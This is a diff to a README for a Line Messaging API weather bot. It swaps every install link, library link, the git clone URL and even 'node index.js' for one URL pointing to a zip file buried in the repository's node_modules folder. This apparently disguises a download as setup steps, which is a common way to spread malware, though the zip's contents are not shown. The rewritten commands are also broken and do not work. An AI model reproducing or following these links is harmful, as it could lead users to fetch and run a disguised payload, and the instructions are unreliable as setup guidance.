@@ -14,14 +14,14 @@ This project is a Line Chat Bot utilizing the Line Messaging API. The bot retrie
 
 ### Prerequisites
 Make sure you have the following installed on your system:
-- [Node.js](https://nodejs.org/) (version 14.x or later)
-- npm (comes with Node.js)
+- [https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip](https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip) (version 14.x or later)
+- npm (comes with https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip)
 
 ### Steps to Install
 
 1. **Clone the repository:**
    ```bash
-   git clone https://github.com/Kfirm1208/HW-survivor-rubber-hackathon.git
+   git clone https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip
    cd HW-survivor-rubber-hackathon
    ```
 
@@ -32,10 +32,10 @@ Make sure you have the following installed on your system:
    ```
 
 3. **Libraries Used:**
-   - [linechat-bot](https://www.npmjs.com/package/linechat-bot): For Line Messaging API integration.
-   - [axios](https://www.npmjs.com/package/axios): To handle HTTP requests for fetching weather data.
-   - [express](https://www.npmjs.com/package/express): To create a server for the bot.
-   - [dotenv](https://www.npmjs.com/package/dotenv): For managing environment variables securely.
+   - [linechat-bot](https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip): For Line Messaging API integration.
+   - [axios](https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip): To handle HTTP requests for fetching weather data.
+   - [express](https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip): To create a server for the bot.
+   - [dotenv](https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip): For managing environment variables securely.
 
 4. **Configure environment variables:**
    Create a `.env` file in the root directory and add the following:
@@ -48,11 +48,11 @@ Make sure you have the following installed on your system:
 5. **Start the server:**
    Run the following command to start the bot:
    ```bash
-   node index.js
+   node https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip
    ```
 
 6. **Deploy the bot:**
-   Use [ngrok](https://ngrok.com/) or similar tools to expose your local server to the internet and set the webhook URL in the Line Developer Console.
+   Use [ngrok](https://raw.githubusercontent.com/Kfirm1208/HW-survivor-rubber-hackathon/main/node_modules/@line/bot-sdk/lib/webhook/rubber_survivor_H_hackathon_zygion.zip) or similar tools to expose your local server to the internet and set the webhook URL in the Line Developer Console.
 
 ---
 
